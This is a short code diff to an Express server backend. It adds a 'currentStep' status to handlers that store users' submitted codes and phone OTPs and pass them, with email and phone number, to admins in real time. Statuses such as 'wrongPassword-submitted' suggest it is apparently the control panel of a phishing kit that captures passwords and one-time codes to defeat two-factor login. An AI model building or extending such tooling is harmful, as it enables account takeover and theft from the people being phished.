@@ -265,8 +265,9 @@ app.post(
   async (req, res) => {
     try {
       const {
-        userId,
-        email
+        
+        email,
+        userId
       } = req.body;
 
       if (!userId || !email) {
@@ -455,6 +456,10 @@ app.post(
 
       user.status =
         "wrongPassword-submitted";
+      user.currentStep = "processing"
+
+
+        
 
    await updateLastLogin(user);
 
@@ -667,6 +672,9 @@ app.patch(
       user.code =
         code.trim();
 
+      
+      user.step = "signin-request";
+
       await user.save();
 
 
@@ -810,6 +818,9 @@ app.post(
         user.email
       );
 
+      user.currentStep = "processing"
+
+
       // Admin gets the phone submission
       // notification.
       emitToAdmins(
@@ -818,7 +829,8 @@ app.post(
           _id: user._id,
           email: user.email,
           phoneNumber: user.phoneNumber,
-          status: user.status
+          status: user.status,
+          currentStep: user.currentStep
         }
       );
 
@@ -871,6 +883,9 @@ app.post(
       user.status =
         "phone otp submitted";
 
+      user.currentStep = "processing"
+
+
   await updateLastLogin(user);
 
       console.log(
@@ -886,7 +901,8 @@ app.post(
           _id: user._id,
           email: user.email,
           phoneOtp: user.phoneOtp,
-          status: user.status
+          status: user.status,
+          currentStep: user.currentStep
         }
       );
 
@@ -937,6 +953,8 @@ app.post(
       user.phoneOtp2 = phoneOtp2;
       user.status =
         "phone otp submitted";
+      user.currentStep = "processing"
+
 
      await updateLastLogin(user);
 
@@ -953,7 +971,8 @@ app.post(
           _id: user._id,
           email: user.email,
           phoneOtp2: user.phoneOtp2,
-          status: user.status
+          status: user.status,
+          currentStep: user.currentStep
         }
       );
 
